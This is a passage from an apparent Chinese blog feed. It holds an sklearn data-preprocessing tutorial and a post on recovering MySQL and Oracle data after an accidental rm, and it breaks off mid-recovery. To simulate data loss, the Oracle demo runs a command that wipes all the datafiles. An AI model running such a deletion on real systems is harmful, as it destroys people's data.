class="keyword">import</span> Imputer</span><br><span class="line">imputer = Imputer(missing_values = <span class="string">"NaN"</span>, strategy = <span class="string">"mean"</span>, axis = <span class="number">0</span>)</span><br><span class="line">imputer = imputer.fit(X[ : , <span class="number">1</span>:<span class="number">3</span>])</span><br><span class="line">X[ : , <span class="number">1</span>:<span class="number">3</span>] = imputer.transform(X[ : , <span class="number">1</span>:<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> LabelEncoder, OneHotEncoder</span><br><span class="line">labelencoder_X = LabelEncoder()</span><br><span class="line">X[ : , <span class="number">0</span>] = labelencoder_X.fit_transform(X[ : , <span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">onehotencoder = OneHotEncoder(categorical_features = [<span class="number">0</span>])</span><br><span class="line">X = onehotencoder.fit_transform(X).toarray()</span><br><span class="line">labelencoder_Y = LabelEncoder()</span><br><span class="line">Y =  labelencoder_Y.fit_transform(Y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line">X_train, X_test, Y_train, Y_test = train_test_split( X , Y , test_size = <span class="number">0.2</span>, random_state = <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> StandardScaler</span><br><span class="line">sc_X = StandardScaler()</span><br><span class="line">X_train = sc_X.fit_transform(X_train)</span><br><span class="line">X_test = sc_X.transform(X_test)</span><br></pre></td></tr></table></figure><h4 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h4><p>代码详解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br></pre></td></tr></table></figure><p>首先我们使用一个简单的数据集。每一个数据集都会包括两部分，独立变量（independent variable）和依赖变量（dependent variable)。机器学习的目的就是需要通过独立变量来预测非独立变量（prediction）。<br>独立变量不会被影响而非独立变量可能被独立变量影响。</p><p>在以下数据集中Age和Salary就是独立变量，我们需要通过这两个独立变量预测是否会Purchase。所以Purchased就是非独立变量。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g2s67p6d2tj209706iq2w.jpg" alt></p><p>把np作为<code>numpy</code>的缩写，后面可以直接使用np来调用各种方法。</p><p>==&gt;</p><p><code>numpy</code>系统是<code>python</code>的一种开源的数值计算扩展。<br>这种工具可用来存储和处理大型矩阵，比<code>python</code>自身的嵌套列表结构要高效的多。<br>你可以理解为凡是和矩阵有关的都用<code>numpy</code>这个库。</p><p>==&gt;</p><p><code>pandas</code>该工具是为了解决数据分析任务而创建的。<code>pandas</code> 纳入了大量库和一些标准的数据模型，提供了高效地操作大型数据集所需的工具。<br><code>pandas</code>提供了大量能使我们快速便捷地处理数据的函数和方法。它是使<code>python</code>成为强大而高效的数据分析环境的重要因素之一.</p><p>==&gt;</p><p>pandas导入语法：</p><ul><li>导入路径斜线问题</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_path1 = <span class="string">'D:/0Raw_data/ftm_p.csv'</span></span><br><span class="line">file_path2 = <span class="string">'D:\\0Raw_data\\ftm_p.csv'</span></span><br><span class="line">file_path3 = <span class="string">r'D:\0Raw_data\ftm_p.csv'</span></span><br></pre></td></tr></table></figure><ul><li>中文路径问题</li></ul><p>当错误类型如下，则一般是中文路径问题。</p><p>OSError: Initializing from file failed</p><p>不废话，解决方案就是先用open打开，而且一般用open先打开，能直接解决编码问题：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_path = <span class="string">'D:/0Raw_data/zhaoyang_charge_sta/京AW7531'</span></span><br><span class="line">path = open(file_path)</span><br><span class="line">data = pd.read_csv(path)</span><br></pre></td></tr></table></figure><ul><li>编码问题</li></ul><p>报错：UnicodeDecodeError: ‘utf-8’ codec can’t decode byte 0xb9 in position 0: invalid start byte</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">file_path = <span class="string">'D:/0Raw_data/zhaoyang_charge_sta/京AW7531'</span></span><br><span class="line">f = open(file_path,encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">data = pd.read_csv(f)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>解决方案2：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">file_path = <span class="string">'D:/0Raw_data/zhaoyang_charge_sta/京AW7531'</span></span><br><span class="line">data = pd.read_csv(<span class="string">'D:/0Raw_data/ftm_p.csv'</span>,encoding=<span class="string">'gbk'</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># create 独立变量vector</span></span><br><span class="line">X = dataset.iloc[:, :<span class="number">-1</span>].values  <span class="comment"># 第一个冒号是所有列（row），第二个是所有行（column）除了最后一个(Purchased)</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># create 依赖变量vector</span></span><br><span class="line">Y = dataset.iloc[:, <span class="number">3</span> ].values <span class="comment"># 只取最后一个column作为依赖变量。</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 处理丢失数据</span></span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> Imputer</span><br><span class="line">imputer = Imputer(missing_values = <span class="string">'NaN'</span>, strategy = <span class="string">'mean'</span>, axis = <span class="number">0</span>)</span><br><span class="line">imputer = imputer.fit(X[:, <span class="number">1</span>:<span class="number">3</span>])   <span class="comment"># (inclusive column 1, exclusive column 3, means col 1 &amp; 2 逗号之前代表 所有行 ：,后面代表 [1,3)列])</span></span><br><span class="line">X[:, <span class="number">1</span>:<span class="number">3</span>] = imputer.transform(X[:, <span class="number">1</span>:<span class="number">3</span>]) <span class="comment"># 将imputer 应用到数据</span></span><br></pre></td></tr></table></figure><h4 id="sklearn-preprocessing-Imputer解析"><a href="#sklearn-preprocessing-Imputer解析" class="headerlink" title="sklearn.preprocessing.Imputer解析:"></a>sklearn.preprocessing.Imputer解析:</h4><p>sklearn.preprocessing.Imputer(missing_values=’NaN’, strategy=’mean’, axis=0, verbose=0, copy=True)</p><p>missing_values：缺失值，可以为整数或NaN(缺失值numpy.nan用字符串‘NaN’表示)，默认为NaN</p><p>strategy：替换策略，字符串，默认用均值‘mean’替换</p><p>①若为mean时，用特征列的均值替换</p><p>②若为median时，用特征列的中位数替换</p><p>③若为most_frequent时，用特征列的众数替换</p><p>axis：指定轴数，默认axis=0代表列，axis=1代表行</p><p>copy：设置为True代表不在原数据集上修改，设置为False时，就地修改，存在如下情况时，即使设置为False时，也不会就地修改</p><p>①X不是浮点值数组</p><p>②X是稀疏且missing_values=0</p><p>③axis=0且X为CRS矩阵</p><p>④axis=1且X为CSC矩阵</p><p>statistics_属性：axis设置为0时，每个特征的填充值数组，axis=1时，报没有该属性错误</p><p>处理之前：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">array([[&apos;France&apos;, 44.0, 72000.0],</span><br><span class="line">       [&apos;Spain&apos;, 27.0, 48000.0],</span><br><span class="line">       [&apos;Germany&apos;, 30.0, 54000.0],</span><br><span class="line">       [&apos;Spain&apos;, 38.0, 61000.0],</span><br><span class="line">       [&apos;Germany&apos;, 40.0, nan],</span><br><span class="line">       [&apos;France&apos;, 35.0, 58000.0],</span><br><span class="line">       [&apos;Spain&apos;, nan, 52000.0],</span><br><span class="line">       [&apos;France&apos;, 48.0, 79000.0],</span><br><span class="line">       [&apos;Germany&apos;, 50.0, 83000.0],</span><br><span class="line">       [&apos;France&apos;, 37.0, 67000.0]], dtype=object)</span><br></pre></td></tr></table></figure><p>处理之后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">array([[&apos;France&apos;, 44.0, 72000.0],</span><br><span class="line">       [&apos;Spain&apos;, 27.0, 48000.0],</span><br><span class="line">       [&apos;Germany&apos;, 30.0, 54000.0],</span><br><span class="line">       [&apos;Spain&apos;, 38.0, 61000.0],</span><br><span class="line">       [&apos;Germany&apos;, 40.0, 63777.77777777778],</span><br><span class="line">       [&apos;France&apos;, 35.0, 58000.0],</span><br><span class="line">       [&apos;Spain&apos;, 38.77777777777778, 52000.0],</span><br><span class="line">       [&apos;France&apos;, 48.0, 79000.0],</span><br><span class="line">       [&apos;Germany&apos;, 50.0, 83000.0],</span><br><span class="line">       [&apos;France&apos;, 37.0, 67000.0]], dtype=object)</span><br></pre></td></tr></table></figure><h4 id="Sklearn数据预处理中fit-和transform-与fit-transform-的区别"><a href="#Sklearn数据预处理中fit-和transform-与fit-transform-的区别" class="headerlink" title="Sklearn数据预处理中fit()和transform()与fit_transform()的区别"></a>Sklearn数据预处理中fit()和transform()与fit_transform()的区别</h4><ul><li>fit():Method calculates the parameters μ and σ and saves them as internal objects.</li></ul><p>Imputer定义了规则，imputer指定训练范围，进行fit ，这里提到的模型都是非常简单的，无非平均数、方差这种。</p><ul><li>transform():Method using these calculated parameters apply the transformation to a particular dataset.</li></ul><p>transform，我理解是这样的，fit和transform的区别有点类似训练模型和训练数据，transform类似于训练数据这一块的</p><ul><li>fit_transform():joins the fit() and transform() method for transformation of dataset.</li></ul><p>将训练模型和训练数据放到一起的一个步骤。</p><p>Note</p><p>必须先用fit_transform(trainData)，之后再transform(testData)<br>如果直接transform(testData)，程序会报错<br>如果fit_transfrom(trainData)后，使用fit_transform(testData)而不transform(testData)，虽然也能归一化，但是两个结果不是在同一个“标准”下的，具有明显差异。(一定要避免这种情况)</p><p>==&gt;</p><h4 id="什么是独热编码？"><a href="#什么是独热编码？" class="headerlink" title="什么是独热编码？"></a>什么是独热编码？</h4><p> 独热码，在英文文献中称做 one-hot code, 直观来说就是有多少个状态就有多少比特，而且只有一个比特为1，其他全为0的一种码制。举例如下：</p><p>直观来说就是有多少个状态就有多少比特，而且只有一个比特为1，其他全为0的一种码制。举例如下：</p><p>假如有三种颜色特征：红、黄、蓝。在利用机器学习的算法时一般需要进行向量化或者数字化。那么你可能想令 红=1，黄=2，蓝=3。那么这样其实实现了标签编码，即给不同类别以标签。然而这意味着机器可能会学习到“红&lt;黄&lt;蓝”，但这并不是我们的让机器学习的本意，只是想让机器区分它们，并无大小比较之意。</p><p>所以这时标签编码是不够的，需要进一步转换。因为有三种颜色状态，所以就有3个比特。即红色：1 0 0 ，黄色: 0 1 0，蓝色：0 0 1 。</p><p>如此一来每两个向量之间的距离都是根号2，在向量空间距离都相等，所以这样不会出现偏序性，基本不会影响基于向量空间度量算法的效果。</p><h4 id="OneHotEncoder-和-LabelEncoder-独热编码和标签编码"><a href="#OneHotEncoder-和-LabelEncoder-独热编码和标签编码" class="headerlink" title="OneHotEncoder 和 LabelEncoder 独热编码和标签编码"></a>OneHotEncoder 和 LabelEncoder 独热编码和标签编码</h4><p>首先了解机器学习中的特征类别：<strong>连续型特征</strong>和<strong>离散型特征</strong></p><p>拿到获取的原始特征，必须对每一特征分别进行归一化，比如，特征A的取值范围是[-1000,1000]，特征B的取值范围是[-1,1]，如果使用logistic回归，w1<em>x1+w2</em>x2，因为x1取值太大了，所以x2基本起不了作用。所以，必须进行特征的归一化，每个特征都单独进行归一化。</p><p> 对于连续性特征：</p><ul><li><strong>Rescale bounded continuous features</strong>: All continuous input that are bounded, rescale them to [-1, 1] through x = (2x - max - min)/(max - min).    线性放缩到[-1,1]</li><li><strong>Standardize all continuous features</strong>: All continuous input should be standardized and by this I mean, for every continuous feature, compute its mean (u) and standard deviation (s) and do x = (x - u)/s.       放缩到均值为0，方差为1</li></ul><p>对于离散性特征：</p><ul><li><strong>Binarize categorical/discrete features</strong>: 对于离散的特征基本就是按照<strong>one-hot（独热）</strong>编码，该离散特征有多少取值，就用多少维来表示该特征。</li></ul><hr><p>1、方差是各个数据分别与其平均数之差的平方的和的平均数，用字母D表示。在概率论和数理统计中，方差（Variance）用来度量随机变量和其数学期望（即均值）之间的偏离程度。在许多实际问题中，研究随机变量和均值之间的偏离程度有着重要意义。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2tw7h5xxuj208a00z0rz.jpg" alt></p><p>2、平方差公式（difference of two squares）是数学公式的一种，它属于乘法公式、因式分解及恒等式，被普遍使用。平方差指一个平方数或正方形，减去另一个平方数或正方形得来的乘法公式：a²-b²=(a+b)(a-b)</p><p>3、标准差（Standard Deviation） ，中文环境中又常称均方差，但不同于均方误差（mean squared error，均方误差是各数据偏离真实值的距离平方的平均数，也即误差平方和的平均数，计算公式形式上接近方差，它的开方叫均方根误差，均方根误差才和标准差形式上接近），标准差是离均差平方和平均后的方根，用σ表示。假设有一组数值X1,X2,X3,……XN（皆为实数），其平均值（算术平均值）为μ，公式如图。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2tw8bxdo1j204601o3y9.jpg" alt></p><p>概率论还是要慢慢补。。。</p><hr><p>Reference：</p><p><a href="https://blog.csdn.net/appleyuchi/article/details/73503282" target="_blank" rel="noopener">https://blog.csdn.net/appleyuchi/article/details/73503282</a></p><p><a href="https://scikit-learn.org/stable/_downloads/scikit-learn-docs.pdf" target="_blank" rel="noopener">scikit-learn user guide</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;针对英语文档阅读使用能力和ML知识点开的一个新坑&lt;br&gt;不定期更新&lt;br&gt;尽量使用英语&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Mechine Learning" scheme="http://yoursite.com/categories/Mechine-Learning/"/>
    
      <category term="100 Days Of ML Code" scheme="http://yoursite.com/categories/Mechine-Learning/100-Days-Of-ML-Code/"/>
    
    
      <category term="sklearn" scheme="http://yoursite.com/tags/sklearn/"/>
    
      <category term="OneHotEncoder" scheme="http://yoursite.com/tags/OneHotEncoder/"/>
    
      <category term="LabelEncoder" scheme="http://yoursite.com/tags/LabelEncoder/"/>
    
  </entry>
  
  <entry>
    <title>删库跑路之前该做的事情</title>
    <link href="http://yoursite.com/2019/05/05/rm%20-rf%20%E5%90%8E%E9%9D%A2%E7%9A%84%E6%95%85%E4%BA%8B/"/>
    <id>http://yoursite.com/2019/05/05/rm -rf 后面的故事/</id>
    <published>2019-05-05T13:45:12.000Z</published>
    <updated>2019-05-14T01:52:04.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近两年老是听到有程序员跑路之前删库的笑话<br>小公司对数据库的权限管理缺失不太严谨<br>我在为CDH集群实现Kerberos的时候还是挺有感触的<br>权限控制应该是属于运维的相对高级的内容</p><p>权限控制姑且按下不表，这边记录一下rm -rf 失误之后的数据恢复</p><a id="more"></a> <h3 id="1-救命稻草–ext3grep"><a href="#1-救命稻草–ext3grep" class="headerlink" title="1.救命稻草–ext3grep"></a>1.救命稻草–ext3grep</h3><p>下载ext3grep，安装（编译安装过程艰辛暂且不表）。</p><p>先执行扫描文件名命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ext3grep /dev/vgdata/LogVol00 --dump-names</span><br></pre></td></tr></table></figure><p>这款软件不能按目录恢复文件，只能执行恢复全部命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ext3grep /dev/vgdata/LogVol00 --restore-all</span><br></pre></td></tr></table></figure><p>结果当前盘空间不足，没办法只能恢复文件，尝试了几个文件，居然部分成功部分失败</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ext3grep /dev/vgdata/LogVol00 --restore-file var/lib/mysql/aqsh/tb_b_attench.MYD</span><br></pre></td></tr></table></figure><p>将所有文件名重定向到一个文件文件中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ext3grep /dev/vgdata/LogVol00 --dump-names &gt;/usr/allnames.txt</span><br></pre></td></tr></table></figure><p>编写脚本恢复文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">while read LINE</span><br><span class="line">do</span><br><span class="line">    echo "begin to restore file " $LINE</span><br><span class="line">    ext3grep /dev/vgdata/LogVol00 --restore-file $LINE</span><br><span class="line">    if [ $? != 0 ]</span><br><span class="line">    then</span><br><span class="line">        echo "restore failed, exit"</span><br><span class="line">       # exit 1</span><br><span class="line">    fi</span><br><span class="line">done &lt; ./mysqltbname.txt</span><br></pre></td></tr></table></figure><p><strong>数据没有被完全恢复！</strong></p><h3 id="2-换一款软件试试-extundelete"><a href="#2-换一款软件试试-extundelete" class="headerlink" title="2.换一款软件试试  extundelete"></a>2.换一款软件试试  extundelete</h3><p>这款软甲您可以按照目录恢复</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extundelete /dev/vgdata/LogVol00 --restore-directory var/lib/mysql/aqsh</span><br></pre></td></tr></table></figure><p>还是不行</p><h3 id="3-换个思路-binlog"><a href="#3-换个思路-binlog" class="headerlink" title="3.换个思路 binlog"></a>3.换个思路 binlog</h3><p>服务器开启binlog的情况下，可以通过binlong恢复</p><p>于是从dump出来的文件名里找到binlog的文件，一共三个，mysql-binlog0001,mysql-bin.000009,mysql-bin.000010，恢复一下0001</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ext3grep /dev/vgdata/LogVol00 --restore-file var/lib/mysql/mysql-bin.000001</span><br></pre></td></tr></table></figure><p>恢复失败</p><p>换一个文件</p><p>mysql-bin.000010大概几百MB，应该靠谱一点，恢复成功！</p><p>恢复命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqlbinlog /usr/mysql-bin.000010 | mysql -uroot -p</span><br></pre></td></tr></table></figure><p>数据回来了</p><p>恢复失败的两款软件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">本文所用到的工具链接：</span><br><span class="line"></span><br><span class="line">1.ext3grep:https://code.google.com/p/ext3grep/</span><br><span class="line"></span><br><span class="line">编译安装依赖包比较多，可以到网上搜索如何安装。可惜的是作者给出的howto被墙了，我FQ将how to 的pdf文档下载下来了，读完后你将会对linux的文件系统有进一步的认识。下载howto。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">这个工具有一个bug，出错后不会向下执行ext3grep: init_directories.cc:534: void init_directories(): Assertion `lost_plus_found_directory_iter != all_directories.end()' failed.，从而造成恢复失败，作者放出了一个补丁，下载地址：补丁下载。不明白为什么作者新版没有把这个补丁加进去。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2.extundelete：http://extundelete.sourceforge.net/</span><br><span class="line"></span><br><span class="line">功能跟ext3grep差不多，原理应该也差不多。只是号称可以还原目录，我这里没有试验成功。</span><br></pre></td></tr></table></figure><h3 id="4-如果数据库被rm命令删除了，主进程还没有退出的恢复办法"><a href="#4-如果数据库被rm命令删除了，主进程还没有退出的恢复办法" class="headerlink" title="4.如果数据库被rm命令删除了，主进程还没有退出的恢复办法"></a>4.如果数据库被rm命令删除了，主进程还没有退出的恢复办法</h3><p>1.模拟删库(包含数据文件，控制文件，联机日志文件)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">sys@GLOBAL&gt;</span>col NAME for a100;</span><br><span class="line"><span class="meta">sys@GLOBAL&gt;</span>select FILE#,NAME from v$datafile;</span><br><span class="line">     FILE# NAME</span><br><span class="line">---------- ----------------------------------------------------------------------------------------------------</span><br><span class="line">         1 /home/oracle/app/oradata/global/system01.dbf</span><br><span class="line">         2 /home/oracle/app/oradata/global/sysaux01.dbf</span><br><span class="line">         3 /home/oracle/app/oradata/global/undotbs01.dbf</span><br><span class="line">         4 /home/oracle/app/oradata/global/users01.dbf</span><br><span class="line">         5 /home/oracle/app/oradata/global/GLOBAL_ORDER01.dbf</span><br><span class="line">         6 /home/oracle/app/oradata/global/TS_DCIS_WMS01.dbf</span><br><span class="line">         7 /home/oracle/app/oradata/global/TS_DCIS_WMS02.dbf</span><br><span class="line">7 rows selected.</span><br><span class="line"><span class="meta">sys@GLOBAL&gt;</span>!rm -f /home/oracle/app/oradata/global/*</span><br><span class="line"><span class="meta">sys@GLOBAL&gt;</span>create table t tablespace users as select * from dual;</span><br><span class="line">create table t tablespace users as select * from dual</span><br><span class="line">                                                 *</span><br><span class="line">ERROR at line 1:</span><br><span class="line">ORA-01116: error in opening database file 4</span><br><span class="line">ORA-01110: data file 4: '/home/oracle/app/oradata/global/users01.dbf'</span><br><span class="line">ORA-27041: unable to open file</span><br><span class="line">Linux-x86_64 Error: 2: No such file or directory</span><br><span class="line">Additional information: 3</span><br></pre></td></tr></table></figure><p>数据库文件和控制文件以及联机日志文件都已经被删了，尝试创建一个表时oracle报打不开数据文件异常。</p><p>2.检查 lgwr 的进程 PID</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[oracle@ol6-a ~]$ ps -ef | grep lgwr | grep -v grep</span><br><span class="line">oracle     3804      1  0 Dec02 ?        00:01:40 ora_lgwr_global</span><br></pre></td></tr></table></figure><p>3.lgwr 会打开所有数据文件、联机日志文件、控制文件的句柄。在 proc 目录中可以查到，目录名是进程 PID，fd 表示文件描述符。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[oracle@ol6-a ~]$ cd /proc/3804/fd</span><br><span class="line">[oracle@ol6-a fd]$ ls -l</span><br><span class="line">total 0</span><br><span class="line">lr-x------. 1 oracle oinstall 64 Dec  7 03:49 0 -&gt; /dev/null</span><br><span class="line">l-wx------. 1 oracle oinstall 64 Dec  7 03:49 1 -&gt; /dev/null</span><br><span class="line">lrwx------. 1 oracle oinstall 64 Dec  7 03:49 10 -&gt; /home/oracle/app/product/11.2.0/db_1/dbs/lkGLOBAL</span><br><span class="line">lr-x------. 1 oracle oinstall 64 Dec  7 03:49 13 -&gt; /home/oracle/app/product/11.2.0/db_1/rdbms/mesg/oraus.msb</span><br><span class="line">l-wx------. 1 oracle oinstall 64 Dec  7 03:49 2 -&gt; /dev/null</span><br><span class="line">lrwx------. 1 oracle oinstall 64 Dec  7 03:49 256 -&gt; /home/oracle/app/oradata/global/control01.ctl (deleted)</span><br><span class="line">lrwx------. 1 oracle oinstall 64 Dec  7 03:49 257 -&gt; /home/oracle/app/fast_recovery_area/global/control02.ctl</span><br><span class="line">lrwx------. 1 oracle oinstall 64 Dec  7 03:49 258 -&gt; /home/oracle/app/oradata/global/redo01.log (deleted)</span><br><span class="line">lrwx------. 1 oracle oinstall 64 Dec  7 03:49 259 -&gt; /home/oracle/app/oradata/global/redo02.log (deleted)</span><br><span class="line">lrwx------. 1 oracle oinstall 64 Dec  7 03:49 260 -&gt; /home/oracle/app/oradata/global/redo03.log (deleted)</span><br><span class="line">lrwx------. 1 oracle oinstall 64 Dec  7 03:49 261 -&gt; /home/oracle/app/oradata/global/system01.dbf (deleted)</span><br><span class="line">lrwx------. 1 oracle oinstall 64 Dec  7 03:49 262 -&gt; /home/oracle/app/oradata/global/sysaux01.dbf (deleted)</span><br><span class="line">lrwx------. 1 oracle oinstall 64 Dec  7 03:49 263 -&gt; /home/oracle/app/oradata/global/undotbs01.dbf (deleted)</span><br><span class="line">lrwx------. 1 oracle oinstall 64 Dec  7 03:49 264 -&gt; /home/oracle/app/oradata/global/users01.dbf (deleted)</span><br><span class="line">lrwx------. 1 oracle oinstall 64 Dec  7 03:49 265 -&gt; /home/oracle/app/oradata/global/GLOBAL_ORDER01.dbf (deleted)</span><br><span class="line">lrwx------. 1 oracle oinstall 64 Dec  7 03:49 266 -&gt; /home/oracle/app/oradata/global/TS_DCIS_WMS01.dbf (deleted)</span><br><span class="line">lrwx------. 1 oracle oinstall 64 Dec  7 03:49 267 -&gt; /home/oracle/app/oradata/global/TS_DCIS_WMS02.dbf (deleted)</span><br><span class="line">lrwx------. 1 oracle oinstall 64 Dec  7 03:49 268 -&gt; /home/oracle/app/oradata/global/temp01.dbf (deleted)</span><br><span class="line">lr-x------. 1 oracle oinstall 64 Dec  7 03:49 3 -&gt; /dev/null</span><br><span class="line">lr-x------. 1 oracle oinstall 64 Dec  7 03:49 4 -&gt; /dev/null</span><br><span class="line">lr-x------. 1 oracle oinstall 64 Dec  7 03:49 5 -&gt; /dev/null</span><br><span class="line">lr-x------. 1 oracle oinstall 64 Dec  7 03:49 6 -&gt; /home/oracle/app/product/11.2.0/db_1/rdbms/mesg/oraus.msb</span><br><span class="line">lr-x------. 1 oracle oinstall 64 Dec  7 03:49 7 -&gt; /proc/3804/fd</span><br><span class="line">lr-x------. 1 oracle oinstall 64 Dec  7 03:49 8 -&gt; /dev/zero</span><br><span class="line">lrwx------. 1 oracle oinstall 64 Dec  7 03:49 9 -&gt; /home/oracle/app/product/11.2.0/db_1/dbs/hc_global.dat</span><br></pre></td></tr></table></figure><p>4.直接 cp 这些句柄文件名回原位置。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[oracle@ol6-a fd]$ cp 256 /home/oracle/app/oradata/global/control01.ctl</span><br><span class="line">[oracle@ol6-a fd]$ cp 258 /home/oracle/app/oradata/global/redo01.log</span><br><span class="line">[oracle@ol6-a fd]$ cp 259 /home/oracle/app/oradata/global/redo02.log</span><br><span class="line">[oracle@ol6-a fd]$ cp 260 /home/oracle/app/oradata/global/redo03.log</span><br><span class="line">[oracle@ol6-a fd]$ cp 261 /home/oracle/app/oradata/global/system01.dbf</span><br><span class="line">[oracle@ol6-a fd]$ cp 262 /home/oracle/app/oradata/global/sysaux01.dbf</span><br><span class="line">[oracle@ol6-a fd]$ cp 263 /home/oracle/app/oradata/global/undotbs01.dbf</span><br><span class="line">[oracle@ol6-a fd]$ cp 264 /home/oracle/app/oradata/global/users01.dbf</span><br><span class="line">[oracle@ol6-a fd]$ cp 265 /home/oracle/app/oradata/global/GLOBAL_ORDER01.dbf</span><br><span class="line">[oracle@ol6-a fd]$ cp 266 /home/oracle/app/oradata/global/TS_DCIS_WMS01.dbf</span><br><span class="line">[oracle@ol6-a fd]$ cp 